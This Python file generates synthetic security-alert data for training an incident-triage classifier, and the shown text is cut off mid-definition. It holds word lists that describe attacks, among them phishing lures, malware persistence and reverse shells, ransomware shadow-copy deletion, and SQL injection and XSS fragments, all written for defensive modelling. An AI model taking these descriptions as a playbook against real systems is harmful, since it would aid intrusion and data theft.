"""
Generate a high-volume synthetic cybersecurity incidents dataset.

Output:
    data/cyber_incidents_simulated.csv

Each row represents a security event / alert with:
- event_id, timestamp
- log_source, event_type, severity, mitre_technique
- user, device
- src_ip, dest_ip, src_country, dest_country
- src_port, dest_port, protocol
- detection_rule, is_true_positive
- description (richer narrative text)
- description_short (short summary)
- description_user_report (user-facing phrasing)
- short_log (log-style message)
"""

import csv
import os
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path
import json
import re
from tqdm import tqdm
import sys, io, contextlib
import argparse

# Load MITRE ATT&CK technique snippets
MITRE_SNIPPETS_PATH = (
    Path(__file__).parent.parent / "data" / "mitre_techniques_snippets.json"
)
if MITRE_SNIPPETS_PATH.exists():
    MITRE_SNIPPETS = json.loads(MITRE_SNIPPETS_PATH.read_text(encoding="utf-8"))
else:
    MITRE_SNIPPETS = {}

# Optional: let an LLM lightly rewrite/enrich synthetic narratives.
# Controlled via env var so the generator can run offline by default.
USE_LLM_FOR_GENERATOR = os.getenv("NLP_TRIAGE_LLM_GENERATOR", "0") == "1"


# Additional LLM configuration for the generator
LLM_GENERATOR_DEBUG = os.getenv("NLP_TRIAGE_LLM_DEBUG", "0") == "1"
LLM_GENERATOR_TEMPERATURE = float(os.getenv("NLP_TRIAGE_LLM_TEMPERATURE", "0.2"))
LLM_GENERATOR_REWRITE_PROB = float(os.getenv("NLP_TRIAGE_LLM_REWRITE_PROB", "0.3"))
LLM_GENERATOR_MAX_RETRIES = int(os.getenv("NLP_TRIAGE_LLM_MAX_RETRIES", "3"))
LLM_GENERATOR_MAX_EVENTS = int(os.getenv("NLP_TRIAGE_LLM_MAX_EVENTS", "1000"))


# Helper for generator LLM debug output (tqdm-friendly)
def _gen_llm_debug(msg: str) -> None:
    """
    Write generator LLM debug messages in a tqdm-friendly way so that
    the progress bar stays at the bottom of the terminal.

    Falls back to a plain print if tqdm is not available for any reason.
    """
    if not LLM_GENERATOR_DEBUG:
        return
    try:
        # tqdm.write() preserves the progress bar placement
        tqdm.write(msg)
    except Exception:
        print(msg, flush=True)


# Simple in-memory cache so identical prompts reuse LLM output
LLM_REWRITE_CACHE = {}
GEN_LLM_REWRITE_COUNT = 0
GEN_LLM_REWRITE_ATTEMPTED = 0
_GEN_LLM = None  # Lazy-initialized llama_cpp.Llama instance for generator rewrites

# Debug config print guard for LLM generator
GEN_LLM_DEBUG_CONFIG_PRINTED = False

# -----------------------------------------------------
# Optional: LLM rewrite reporting globals
# -----------------------------------------------------
REWRITE_REPORT = []
REWRITE_REPORT_PATH: str | None = None
REWRITE_REPORT_ENABLED = False

# ---------------------------------
# 1. Core vocab and configuration
# ---------------------------------
# -----------------------------------------------------
# Hierarchical Class Families (to prevent label collapse)
# -----------------------------------------------------
# Access / Identity family: access_abuse, credential_compromise
# Data movement family: data_exfiltration, insider_threat (includes data movement)
# Insider / misuse family: insider_threat, policy_violation
# Network / infra family: web_attack, suspicious_network_activity
# Threat content: phishing, malware
# Non-security: benign_activity

# Classes that are easy to confuse in real life (family-based overlap)
CONFUSABLE = {
    # Access/Identity family
    "access_abuse": ["access_abuse", "credential_compromise", "web_attack"],
    "credential_compromise": [
        "credential_compromise",
        "access_abuse",
        "insider_threat",
    ],
    # Data movement family
    "data_exfiltration": ["data_exfiltration", "insider_threat", "policy_violation"],
    "insider_threat": ["insider_threat", "data_exfiltration", "policy_violation"],
    # Network/Infra family
    "web_attack": ["web_attack", "suspicious_network_activity", "access_abuse"],
    "suspicious_network_activity": [
        "suspicious_network_activity",
        "web_attack",
        "benign_activity",
    ],
    # Insider/Misuse family
    "policy_violation": ["policy_violation", "insider_threat", "data_exfiltration"],
    # Threat content - malware is distinct, should not confuse with benign
    "malware": ["malware", "policy_violation"],
    "phishing": ["phishing", "benign_activity"],
    # Non-security
    "benign_activity": [
        "benign_activity",
        "suspicious_network_activity",
        "policy_violation",
    ],
}

LABEL_NOISE_P = 0.03  # 3% noisy labels to mimic messy real-world tickets

# Small, controlled label noise to avoid a "too perfect" synthetic dataset
LABEL_NOISE_RATE = 0.08  # 8% of rows will have a slightly "off" label

# Neighboring / confusable classes for label noise
NEIGHBOR_LABELS = {
    "phishing": ["benign_activity", "access_abuse"],
    "malware": [
        "policy_violation"
    ],  # Removed benign_activity - malware should not be confused with benign
    "access_abuse": ["credential_compromise", "web_attack"],
    "credential_compromise": ["access_abuse", "insider_threat"],
    "data_exfiltration": ["insider_threat", "policy_violation"],
    "insider_threat": ["data_exfiltration", "policy_violation"],
    "policy_violation": ["insider_threat", "data_exfiltration"],
    "web_attack": ["suspicious_network_activity", "access_abuse"],
    "suspicious_network_activity": ["web_attack", "benign_activity"],
    "benign_activity": [
        "suspicious_network_activity",
        "policy_violation",
    ],  # Removed malware
}

EVENT_TYPES = [
    "phishing",
    "malware",
    "access_abuse",
    "credential_compromise",
    "data_exfiltration",
    "insider_threat",
    "policy_violation",
    "web_attack",
    "suspicious_network_activity",
    "benign_activity",
]

LOG_SOURCES = [
    "email_gateway",
    "edr",
    "proxy",
    "firewall",
    "idp",
    "dlp",
    "waf",
    "siem",
    "hr_system",
    "mfa_logs",
    "ids",
    "netflow",
]

SEVERITIES = ["info", "low", "medium", "high", "critical"]
PROTOCOLS = ["TCP", "UDP", "HTTP", "HTTPS"]

USERS = [
    "alice.w",
    "bob.j",
    "charlie.k",
    "diana.s",
    "eric.m",
    "frank.r",
    "gina.t",
    "hank.l",
    "ivan.p",
    "julia.c",
    "karen.b",
    "leo.v",
    "maria.h",
    "nate.d",
    "olivia.p",
]

DEVICES = [
    "WIN10-LAPTOP-01",
    "WIN10-LAPTOP-02",
    "WIN10-LAPTOP-03",
    "SRV-FILE-01",
    "SRV-DC-01",
    "SRV-APP-01",
    "MACBOOK-SEC-01",
    "LINUX-WEB-01",
    "LINUX-DB-01",
    "VPN-GW-01",
]

COUNTRIES = ["US", "CA", "GB", "DE", "FR", "IN", "JP", "BR", "CN", "RU"]

DOMAINS = [
    "corp.example.com",
    "intranet.example.com",
    "vpn.example.com",
    "portal.example.com",
    "support.example.com",
    "login.example.com",
]

MALICIOUS_DOMAINS = [
    "login-secure-support.com",
    "office365-verify-login.net",
    "secure-update-billing.org",
    "cloud-storage-review.io",
]

EVENT_TO_MITRE = {
    "phishing": ["T1566", "T1598"],
    "malware": ["T1059", "T1204", "T1105"],
    "access_abuse": ["T1078", "T1110"],
    "credential_compromise": [
        "T1556",
        "T1539",
        "T1528",
    ],  # Modify Auth Mechanisms, Steal Web Session Cookie, Steal Application Access Token
    "data_exfiltration": ["T1048", "T1020"],
    "insider_threat": [
        "T1530",
        "T1087",
        "T1213",
    ],  # Data from Cloud Storage, Account Discovery, Data from Information Repositories
    "policy_violation": ["T1036", "T1082"],
    "web_attack": ["T1190", "T1059.007"],
    "suspicious_network_activity": [
        "T1046",
        "T1595",
        "T1040",
    ],  # Network Service Discovery, Active Scanning, Network Sniffing
    "benign_activity": ["T0000"],
}

EVENT_TO_SOURCES = {
    "phishing": ["email_gateway", "proxy", "siem"],
    "malware": ["edr", "firewall", "siem"],
    "access_abuse": ["idp", "vpn", "firewall", "siem"],
    "credential_compromise": ["idp", "mfa_logs", "edr", "siem"],
    "data_exfiltration": ["proxy", "dlp", "firewall", "siem"],
    "insider_threat": ["edr", "dlp", "hr_system", "siem"],
    "policy_violation": ["edr", "dlp", "siem"],
    "web_attack": ["waf", "firewall", "proxy", "siem"],
    "suspicious_network_activity": ["ids", "firewall", "netflow", "siem"],
    "benign_activity": ["siem", "proxy", "idp"],
}

COMMON_PORTS_BY_TYPE = {
    "phishing": [25, 80, 443],
    "malware": [445, 135, 139, 3389, 80],
    "access_abuse": [443, 1812, 1813, 22],
    "credential_compromise": [443, 1812, 22, 3389],
    "data_exfiltration": [443, 22, 8080, 8443],
    "insider_threat": [443, 445, 22, 8080],
    "policy_violation": [80, 443, 445],
    "web_attack": [80, 443, 8080, 8443],
    "suspicious_network_activity": [
        22,
        23,
        445,
        3389,
        8080,
        1433,
        3306,
        5432,
    ],  # Scanning common services
    "benign_activity": [80, 443, 22, 445],
}

DETECTION_RULES = {
    "phishing": [
        "Email – Suspicious sender domain",
        "Email – Credential harvest link",
        "Email – Known phishing campaign",
    ],
    "malware": [
        "EDR – Suspicious PowerShell",
        "AV – Known malware hash",
        "EDR – Ransomware behavior",
    ],
    "access_abuse": [
        "IDP – Impossible travel login",
        "VPN – Brute-force attempt",
        "SSO – Login from new device",
    ],
    "credential_compromise": [
        "MFA – Accepted from unknown device",
        "IDP – Session cookie stolen",
        "SSO – MFA fatigue attack detected",
        "IDP – User denies recent activity",
    ],
    "data_exfiltration": [
        "DLP – Large outbound transfer",
        "Proxy – Unusual upload volume",
        "Firewall – Data transfer to rare country",
    ],
    "insider_threat": [
        "HR – Employee on PIP accessing sensitive data",
        "EDR – Offboarding user bulk file access",
        "DLP – Resigned employee exporting documents",
        "SIEM – After-hours access by disgruntled employee",
    ],
    "policy_violation": [
        "EDR – Unauthorized software",
        "DLP – Sensitive file on public share",
        "Config – Cleartext credentials detected",
    ],
    "web_attack": [
        "WAF – SQL injection attempt",
        "WAF – XSS attempt",
        "WAF – Web brute-force",
    ],
    "suspicious_network_activity": [
        "IDS – Port scanning detected",
        "Firewall – Unusual egress pattern",
        "NetFlow – Beaconing to external host",
        "IDS – Internal reconnaissance activity",
    ],
    "benign_activity": [
        "System – Routine maintenance",
        "Monitoring – Capacity threshold alert",
        "ServiceDesk – Non-security ticket",
    ],
}

# Scenario subtypes to introduce overlap and realism
PHISHING_SUBTYPES = [
    "credential_harvest",
    "malware_delivery",
    "business_email_compromise",
    "generic",
]
MALWARE_SUBTYPES = ["generic", "ransomware", "trojan", "loader"]
ACCESS_ABUSE_SUBTYPES = ["impossible_travel", "brute_force", "compromised_account"]
DATA_EXFILTRATION_SUBTYPES = [
    "cloud_upload",
    "email_exfil",
    "staged_transfer",
    "usb_transfer",
]
POLICY_VIOLATION_SUBTYPES = ["shadow_it", "data_handling", "config_risk"]
WEB_ATTACK_SUBTYPES = ["sqli", "xss", "bruteforce", "ddos"]
BENIGN_SUBTYPES = ["maintenance", "outage", "noise", "pentest"]
INSIDER_THREAT_SUBTYPES = ["data_hoarding", "resignation", "disgruntled", "offboarding"]
CREDENTIAL_COMPROMISE_SUBTYPES = [
    "mfa_fatigue",
    "session_hijack",
    "token_theft",
    "user_denies",
]
SUSPICIOUS_NETWORK_SUBTYPES = [
    "port_scan",
    "beaconing",
    "lateral_movement",
    "reconnaissance",
]

# -----------------------------------------------------
# Rich contextual vocabularies for new event types
# -----------------------------------------------------

# HR-related context for insider threats
HR_CONTEXTS = [
    "employee on Performance Improvement Plan (PIP)",
    "staff member who submitted resignation two weeks ago",
    "contractor whose access expires within 72 hours",
    "employee flagged in recent HR investigation",
    "user undergoing offboarding process",
    "disgruntled team member with recent negative reviews",
]

HR_TIMING_PHRASES = [
    "during the weekend before their last day",
    "after hours on a holiday",
    "immediately following a disciplinary meeting",
    "days before scheduled termination",
    "late evening during the notice period",
]

INSIDER_BEHAVIORAL_CUES = [
    "accessing files outside their normal job function",
    "bulk downloading sensitive documents",
    "copying customer data to personal devices",
    "exporting intellectual property repositories",
    "querying HR databases without authorization",
]

# MFA and authentication context for credential compromise
MFA_ANOMALIES = [
    "MFA prompt accepted from an unrecognized device in a foreign country",
    "MFA fatigue attack with 47 push notifications within 3 minutes",
    "session cookie stolen and reused from a different IP",
    "authentication token valid beyond normal expiry window",
    "user accepted MFA from device they claim not to own",
]

USER_DENIAL_PHRASES = [
    "user explicitly denies initiating this activity",
    "employee reports they were not at that location",
    "user claims their device was powered off at the time",
    "account holder states they did not approve the MFA request",
]

DEVICE_FINGERPRINT_CUES = [
    "browser fingerprint does not match historical baselines",
    "device enrolled in MFA only hours before this incident",
    "unrecognized user-agent string from unusual geography",
    "new mobile device registered outside corporate provisioning process",
]

# Network behavior patterns for suspicious_network_activity
SCANNING_PATTERNS = [
    "sequential port probes across 200+ internal hosts",
    "systematic SYN scans targeting common database ports",
    "reconnaissance sweep of LDAP and Kerberos services",
    "automated enumeration of SMB shares on file servers",
]

BEACONING_PATTERNS = [
    "periodic callbacks to external IP every 60 seconds",
    "consistent HTTP requests with encoded payloads at fixed intervals",
    "DNS queries to suspicious domain with mathematical regularity",
    "HTTPS connections establishing command-and-control-like traffic patterns",
]

LATERAL_MOVEMENT_CUES = [
    "unusual internal RDP sessions between workstations",
    "abnormal SMB activity from non-admin endpoints",
    "PowerShell remoting initiated from unexpected hosts",
    "WMI queries executed across multiple systems in sequence",
]

# -----------------------------------------------------
# Rich contextual vocabularies for original 7 event types
# -----------------------------------------------------

# PHISHING - Social engineering and credential harvesting
PHISHING_LURES = [
    "urgent password reset required",
    "account verification needed within 24 hours",
    "suspicious activity detected on your account",
    "confirm your identity to prevent account suspension",
    "update billing information to avoid service interruption",
    "IT security upgrade - action required",
    "multi-factor authentication enrollment mandatory",
    "payroll direct deposit information needs updating",
    "your package delivery requires address confirmation",
    "COVID-19 safety training completion required",
    "annual security awareness test - respond within 48 hours",
    "benefits enrollment deadline approaching",
    "email quota exceeded - verify account to restore access",
    "unusual sign-in attempt from new location detected",
    "shared document requires immediate approval",
    "expense report rejected - review and resubmit",
    "voicemail notification - listen to new message",
    "security certificate expiring - renew now",
    "HR policy acknowledgment required",
    "tax form W-2 available for download",
]

PHISHING_SENDER_SPOOFS = [
    "spoofed to appear from IT Help Desk",
    "forged sender header mimicking executive leadership",
    "domain typosquatting (corp-examp1e.com vs corp-example.com)",
    "display name spoofing while actual sender is external",
    "compromised vendor email account sending to customers",
    "lookalike domain using Unicode characters (corρ-example.com)",
    "spoofed HR department with incorrect reply-to address",
    "fake cloud service notification (microsоft.com with Cyrillic 'o')",
    "compromised contractor account sending internally",
    "CEO name with personal Gmail address in from field",
    "fake IT service desk using subdomain (helpdesk.corp-support.com)",
    "spoofed accounting department during invoice period",
]

PHISHING_ARTIFACTS = [
    "link redirects through multiple URL shorteners",
    "landing page clones the corporate SSO portal",
    "HTML email with embedded credential form",
    "attachment contains macro-enabled document requesting enable content",
    "QR code leading to credential harvesting site",
    "shortened URL expands to suspicious domain with random subdomain",
    "embedded form harvests credentials before redirecting to legitimate site",
    "PDF attachment with embedded malicious link",
    "fake DocuSign/Adobe Sign page requesting credentials",
    "OneNote attachment with embedded malicious payload",
    "HTML attachment that opens as fake login page",
    "password-protected ZIP with malicious executable",
    "fake Microsoft Teams/Slack notification with credential harvest link",
    "calendar invite with malicious ICS attachment",
]

# MALWARE - Malicious code execution patterns
MALWARE_DELIVERY_METHODS = [
    "email attachment with obfuscated VBA macro",
    "drive-by download from compromised legitimate website",
    "fake software update prompt on website",
    "malicious browser extension installed via social engineering",
    "USB device with autorun payload",
    "trojanized installer from unofficial download site",
    "exploited vulnerability in unpatched PDF reader",
    "watering hole attack on industry-specific forum",
    "malicious advertisement (malvertising) on legitimate site",
    "SEO poisoning leading to malware download",
    "fake codec/player download for media file",
    "compromised software update mechanism",
    "malicious macro in Excel template from file sharing site",
    "backdoored mobile app from third-party store",
    "supply chain compromise via npm/pip package",
]

MALWARE_BEHAVIORS = [
    "process injection into legitimate system processes",
    "registry persistence keys modified for autostart",
    "outbound connections to known command-and-control infrastructure",
    "disabling Windows Defender and security tools",
    "lateral movement attempts using stolen credentials",
    "scheduled tasks created for persistence",
    "creating hidden user accounts with administrative privileges",
    "downloading additional payloads from external servers",
    "keylogging and credential theft from browser password stores",
    "modifying host file to redirect legitimate domains",
    "establishing reverse shell on non-standard port",
    "enumerating network shares and mapped drives",
    "clearing Windows event logs to hide tracks",
    "installing rootkit to hide presence",
    "beaconing to C2 with encoded DNS queries",
    "stealing browser cookies and session tokens",
    "establishing persistence via WMI event subscription",
]

RANSOMWARE_INDICATORS = [
    "mass file encryption with unknown extension (.locked, .encrypted, .DEADBEEF)",
    "ransom note dropped in multiple directories (HOW_TO_DECRYPT.txt)",
    "volume shadow copies deleted via vssadmin",
    "cryptocurrency wallet address displayed for payment",
    "wallpaper changed to ransom demand message",
    "network shares encrypted from single endpoint",
]

# ACCESS_ABUSE - Authentication and authorization violations
IMPOSSIBLE_TRAVEL_PATTERNS = [
    "login from New York at 9am, then from Beijing at 9:15am same day",
    "simultaneous active sessions from geographically impossible locations",
    "timezone-inconsistent activity (European user active at 3am local time)",
    "travel velocity exceeds commercial flight speeds",
]

BRUTE_FORCE_INDICATORS = [
    "87 failed login attempts followed by single success",
    "password spray attack testing common passwords across many accounts",
    "repeated lockouts from same source IP rotating through usernames",
    "authentication attempts against disabled accounts",
    "login attempts using previously breached credential pairs",
]

COMPROMISED_ACCOUNT_BEHAVIORS = [
    "unusual email forwarding rules created immediately after login",
    "mass mailbox searches for financial or sensitive keywords",
    "access to SharePoint sites outside user's department",
    "file downloads at rate inconsistent with normal user behavior",
]

# DATA_EXFILTRATION - Data theft and unauthorized transfers
EXFIL_STAGING_METHODS = [
    "files archived with password protection before upload",
    "data copied to hidden network share first, then uploaded",
    "sensitive documents staged in cloud sync folder",
    "email drafts with attachments saved (never sent) for later retrieval",
    "data split into small chunks uploaded across multiple days",
]

EXFIL_DESTINATIONS = [
    "personal Gmail/Outlook account via webmail",
    "unapproved cloud storage (Mega.nz, MediaFire, pCloud)",
    "file transfer to residential IP via FTP/SFTP",
    "data uploaded to anonymous paste site or text hosting",
    "Tor exit node communication suggesting dark web upload",
]

EXFIL_TIMING_ANOMALIES = [
    "bulk transfers initiated at 2am outside business hours",
    "sustained high upload bandwidth over weekend",
    "data movement coinciding with employee PTO days",
    "transfer rate spikes right before quarterly earnings call",
]

# POLICY_VIOLATION - Unintentional security misconfigurations
SHADOW_IT_BEHAVIORS = [
    "unauthorized cloud collaboration tool installed (Slack, Discord for work)",
    "personal VPN client running on corporate laptop",
    "unapproved file sync client (Resilio, SyncThing) detected",
    "browser extension with excessive permissions installed",
]

DATA_HANDLING_VIOLATIONS = [
    "customer PII stored in unencrypted Excel on desktop",
    "sensitive documents uploaded to personal OneDrive",
    "credentials stored in plaintext Notepad file",
    "confidential data sent via unencrypted email to external recipient",
    "database backup copied to USB drive without encryption",
]

CONFIGURATION_RISKS = [
    "service account password set to never expire",
    "administrative privileges granted to standard user account",
    "firewall rule allowing any-to-any traffic created",
    "debug logging enabled in production exposing sensitive data",
]

# WEB_ATTACK - Application layer exploitation
SQL_INJECTION_PATTERNS = [
    "UNION SELECT statements in URL parameters",
    "single quote and comment sequences in form fields ('; --)",
    "time-based blind SQLi with WAITFOR DELAY commands",
    "error-based injection triggering database error messages",
    "automated sqlmap tool signatures in request headers",
]

XSS_ATTACK_PATTERNS = [
    "<script> tags injected into search fields and reflected in response",
    "JavaScript event handlers in user profile fields (onload=, onerror=)",
    "iframe injection attempting to load external malicious site",
    "DOM-based XSS manipulating client-side scripts",
]

WEB_BRUTEFORCE_CHARACTERISTICS = [
    "credential stuffing using leaked database passwords",
    "high-frequency login attempts with username enumeration",
    "rotating source IPs from botnet or proxy network",
    "failed attempts with common/default credentials (admin/admin)",
]

# BENIGN_ACTIVITY - Operational noise and false positives
MAINTENANCE_ACTIVITIES = [
    "scheduled Windows patching causing high CPU and reboots",
    "antivirus definition updates generating network traffic",
    "backup jobs running during maintenance window",
    "database index rebuild operations affecting performance",
    "certificate renewal automation testing LDAP connectivity",
]

MONITORING_NOISE = [
    "vulnerability scanner performing authenticated scans",
    "penetration test by authorized security vendor",
    "synthetic monitoring probes checking service availability",
    "security orchestration playbook testing response workflows",
]

USER_PRODUCTIVITY_TOOLS = [
    "auto-clicker or macro tool for repetitive data entry",
    "screen recording software for training video creation",
    "legacy business application requiring Java/Flash compatibility mode",
    "developer using packet capture for legitimate troubleshooting",
]

# Synonyms and noise helpers
DETECT_VERBS = [
    "detected",
    "flagged",
    "observed",
    "identified",
    "noted",
    "discovered",
    "found",
    "spotted",
    "uncovered",
]

REPORT_VERBS = [
    "reported",
    "raised",
    "opened a ticket for",
    "mentioned",
    "alerted about",
    "notified regarding",
    "flagged",
]

TRIAGE_PHRASES = [
    "Initial triage shows",
    "According to available logs",
    "Based on current evidence",
    "At this stage",
    "From the first pass review",
    "Preliminary analysis indicates",
    "Early investigation reveals",
    "Initial assessment suggests",
    "First-level review shows",
    "Based on initial findings",
]

ABBREVIATIONS = {
    "user": ["usr", "user"],
    "reported": ["rptd", "reported"],
    "connection": ["conn", "connection"],
    "server": ["srv", "server"],
    "workstation": ["ws", "workstation"],
    "administrator": ["admin", "administrator"],
    "authentication": ["auth", "authentication"],
    "configuration": ["config", "configuration"],
}

# Comprehensive synonym dictionary for text augmentation
SYNONYM_DICT = {
    "detected": [
        "identified",
        "found",
        "discovered",
        "observed",
        "spotted",
        "uncovered",
    ],
    "suspicious": [
        "anomalous",
        "unusual",
        "questionable",
        "concerning",
        "irregular",
        "atypical",
        "dubious",
    ],
    "alert": ["notification", "warning", "alarm", "signal", "advisory"],
    "user": ["employee", "account", "individual", "person", "staff member"],
    "attempted": ["tried", "initiated", "executed", "performed", "carried out"],
    "malicious": ["harmful", "dangerous", "threatening", "hostile", "nefarious"],
    "activity": ["behavior", "action", "event", "operation", "conduct"],
    "unauthorized": ["unapproved", "illegitimate", "forbidden", "unpermitted"],
    "attack": ["exploit", "assault", "intrusion", "breach attempt", "offensive"],
    "compromised": ["breached", "infected", "penetrated", "violated", "infiltrated"],
    "connected": ["linked", "contacted", "communicated with", "reached out to"],
    "file": ["document", "data file", "record"],
    "system": ["host", "machine", "endpoint", "device"],
    "network": ["infrastructure", "environment", "connectivity"],
    "accessed": ["retrieved", "opened", "viewed", "obtained"],
    "triggered": ["activated", "fired", "initiated", "set off"],
    "pattern": ["signature", "behavior", "characteristic", "trend"],
    "multiple": ["several", "numerous", "various", "many"],
    "unusual": ["abnormal", "irregular", "atypical", "uncommon"],
    "indicate": ["suggest", "show", "reveal", "demonstrate"],
    "appeared": ["emerged", "surfaced", "showed up", "materialized"],
    "sensitive": ["confidential", "classified", "restricted", "privileged"],
    "failed": ["unsuccessful", "denied", "rejected", "blocked"],
    "external": ["outside", "foreign", "third-party", "remote"],
    "internal": ["inside", "corporate", "organizational", "in-house"],
}

# ------------------------
# 2. Helper functions
# ------------------------


def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def random_port_for_event(event_type):
    ports = COMMON_PORTS_BY_TYPE.get(event_type, [80, 443])
    if random.random() < 0.8:
        return random.choice(ports)
    return random.randint(1, 65535)


def random_protocol():
    return random.choice(PROTOCOLS)


def random_url_path():
    return random.choice(
        [
            "/login",
            "/reset",
            "/invoice",
            "/api/v1/users",
            "/admin",
            "/report",
            "/status",
        ]
    )


def random_timestamp(start, end):
    delta = end - start
    seconds = random.randint(0, int(delta.total_seconds()))
    return start + timedelta(seconds=seconds)


def choose_log_source(event_type):
    sources = EVENT_TO_SOURCES.get(event_type, LOG_SOURCES)
    return random.choice(sources)


# Map your high-level event types to plausible ATT&CK techniques.
# Enhanced mappings with more comprehensive technique coverage
EVENT_TO_TECHNIQUES = {
    "phishing": [
        "T1566.001",  # Spearphishing Attachment
        "T1566.002",  # Spearphishing Link
        "T1598",  # Phishing for Information
    ],
    "malware": [
        "T1059.001",  # PowerShell
        "T1204.002",  # Malicious File
        "T1486",  # Data Encrypted for Impact (ransomware)
        "T1105",  # Ingress Tool Transfer
        "T1059.003",  # Windows Command Shell
    ],
    "data_exfiltration": [
        "T1041",  # Exfiltration Over C2 Channel
        "T1567.002",  # Exfiltration to Cloud Storage
        "T1048",  # Exfiltration Over Alternative Protocol
        "T1020",  # Automated Exfiltration
    ],
    "policy_violation": [
        "T1133",  # External Remote Services
        "T1098",  # Account Manipulation
        "T1052",  # Exfiltration Over Physical Medium
        "T1036",  # Masquerading
    ],
    "web_attack": [
        "T1190",  # Exploit Public-Facing Application
        "T1110.001",  # Password Guessing
        "T1059.007",  # JavaScript (for XSS)
        "T1499",  # Endpoint Denial of Service
    ],
    "access_abuse": [
        "T1078",  # Valid Accounts
        "T1110",  # Brute Force
        "T1021",  # Remote Services
    ],
    "credential_compromise": [
        "T1110",  # Brute Force
        "T1556",  # Modify Authentication Process
        "T1539",  # Steal Web Session Cookie
        "T1528",  # Steal Application Access Token
    ],
    "insider_threat": [
        "T1078",  # Valid Accounts
        "T1530",  # Data from Cloud Storage
        "T1087",  # Account Discovery
        "T1213",  # Data from Information Repositories
    ],
    "suspicious_network_activity": [
        "T1046",  # Network Service Discovery
        "T1595",  # Active Scanning
        "T1040",  # Network Sniffing
        "T1071",  # Application Layer Protocol (C2)
    ],
    "benign_activity": [],  # we usually won't map benign to ATT&CK
}


def choose_mitre(event_type: str) -> dict | None:
    """
    Return a dict with id/name/short for a randomly chosen MITRE ATT&CK
    technique relevant to this event_type, or None if no mapping.
    """
    tech_ids = EVENT_TO_TECHNIQUES.get(event_type, [])
    if not tech_ids:
        return None

    tech_id = random.choice(tech_ids)
    snippet = MITRE_SNIPPETS.get(tech_id)

    if not snippet:
        return None

    return {
        "id": tech_id,
        "name": snippet.get("name", ""),
        "short": snippet.get("short", ""),
    }


def choose_severity(event_type, subtype=None):
    # Roughly bias severity by event type and subtype
    if event_type in {"malware", "data_exfiltration", "insider_threat"}:
        if event_type == "malware" and subtype == "ransomware":
            weights = [0, 0, 1, 3, 4]  # ransomware skewed high/critical
        elif event_type == "insider_threat" and subtype in {
            "resignation",
            "offboarding",
        }:
            weights = [0, 1, 2, 4, 3]  # insider threats with HR context are serious
        else:
            weights = [1, 1, 2, 3, 3]
    elif event_type == "credential_compromise":
        weights = [0, 1, 2, 4, 3]  # credential compromise is typically high severity
    elif event_type == "suspicious_network_activity":
        # Network recon can be anywhere from noise to critical
        weights = [2, 3, 3, 2, 1]
    elif event_type == "web_attack":
        weights = [1, 1, 2, 3, 3]
    elif event_type == "benign_activity":
        weights = [4, 3, 1, 0, 0]
    else:
        weights = [1, 2, 3, 2, 1]
    return random.choices(SEVERITIES, weights=weights)[0]


def choose_true_positive(event_type, subtype=None):
    if event_type == "benign_activity":
        return 0
    if event_type == "malware" and subtype == "ransomware":
        return 1 if random.random() < 0.9 else 0
    if event_type in {"malware", "data_exfiltration", "insider_threat"}:
        # Insider threats with resignation/offboarding context are very likely TP
        if event_type == "insider_threat" and subtype in {"resignation", "offboarding"}:
            return 1 if random.random() < 0.85 else 0
        return 1 if random.random() < 0.8 else 0
    if event_type == "credential_compromise":
        # Credential compromise with user denial is highly likely TP
        if subtype == "user_denies":
            return 1 if random.random() < 0.85 else 0
        return 1 if random.random() < 0.75 else 0
    if event_type in {"phishing", "access_abuse"}:
        return 1 if random.random() < 0.7 else 0
    if event_type == "suspicious_network_activity":
        # Network scanning can be noisy (pentests, vulnerability scanners)
        if subtype == "port_scan":
            return 1 if random.random() < 0.55 else 0
        return 1 if random.random() < 0.65 else 0
    return 1 if random.random() < 0.5 else 0


def choose_detection_rule(event_type):
    return random.choice(DETECTION_RULES.get(event_type, ["Generic detection rule"]))


def random_user():
    return random.choice(USERS)


def random_device():
    return random.choice(DEVICES)


def random_countries():
    src = random.choice(COUNTRIES)
    if random.random() < 0.7:
        dest = src
    else:
        dest = random.choice([c for c in COUNTRIES if c != src])
    return src, dest


def inject_typo(word: str) -> str:
    if len(word) <= 3:
        return word
    if random.random() > 0.2:
        return word
    idx = random.randint(1, len(word) - 2)
    chars = list(word)
    chars[idx], chars[idx + 1] = chars[idx + 1], chars[idx]
    return "".join(chars)


def maybe_abbreviate(token: str) -> str:
    lower = token.lower()
    if lower in ABBREVIATIONS and random.random() < 0.3:
        return random.choice(ABBREVIATIONS[lower])
    return token


def add_noise_to_sentence(text: str) -> str:
    tokens = text.split()
    noisy_tokens = []
    for t in tokens:
        base = maybe_abbreviate(t)
        base = inject_typo(base)
        noisy_tokens.append(base)
    return " ".join(noisy_tokens)


def augment_with_synonyms(text: str, replacement_prob=0.3, max_replacements=3) -> str:
    """
    Augment text by replacing words with synonyms from SYNONYM_DICT.

    Args:
        text: Input text to augment
        replacement_prob: Probability of replacing each eligible word
        max_replacements: Maximum number of words to replace

    Returns:
        Augmented text with synonym replacements
    """
    words = text.split()
    replaced_count = 0

    for i, word in enumerate(words):
        if replaced_count >= max_replacements:
            break

        # Extract word without punctuation
        word_lower = word.lower().strip(".,!?;:()[]{}\"'")

        # Check if word has synonyms and should be replaced
        if word_lower in SYNONYM_DICT and random.random() < replacement_prob:
            synonym = random.choice(SYNONYM_DICT[word_lower])

            # Preserve capitalization
            if word[0].isupper():
                synonym = synonym.capitalize()

            # Preserve punctuation
            punctuation = word[len(word_lower) :]
            words[i] = synonym + punctuation
            replaced_count += 1

    return " ".join(words)


def create_borderline_scenario(event_type: str, desc_dict: dict) -> dict:
    """
    Create borderline/ambiguous scenarios by mixing elements from confusable classes.
    This makes the classification task harder and more realistic.

    Args:
        event_type: The primary event type
        desc_dict: Dictionary with description fields

    Returns:
        Modified description dictionary with borderline characteristics
    """
    # Get confusable classes for this event type
    confusable_classes = CONFUSABLE.get(event_type, [event_type])

    # Borderline modifiers for different class pairs
    borderline_phrases = {
        ("phishing", "benign_activity"): [
            "However, the sender appears to be a known vendor",
            "The email content seems legitimate but the link is suspicious",
            "User states they were expecting this type of notification",
            "Similar messages have been sent before without incident",
        ],
        ("data_exfiltration", "policy_violation"): [
            "User claims they were backing up work files for remote access",
            "The transfer was to an approved cloud provider but not following procedure",
            "Employee states this is normal for their role but lacks documentation",
        ],
        ("access_abuse", "credential_compromise"): [
            "User acknowledges the login but says timing seems off",
            "Login location matches known travel but device is unrecognized",
            "User may have shared credentials with contractor for urgent access",
        ],
        ("malware", "benign_activity"): [
            "The process is associated with legitimate software but behavior is unusual",
            "IT recently deployed new monitoring tools that trigger similar signatures",
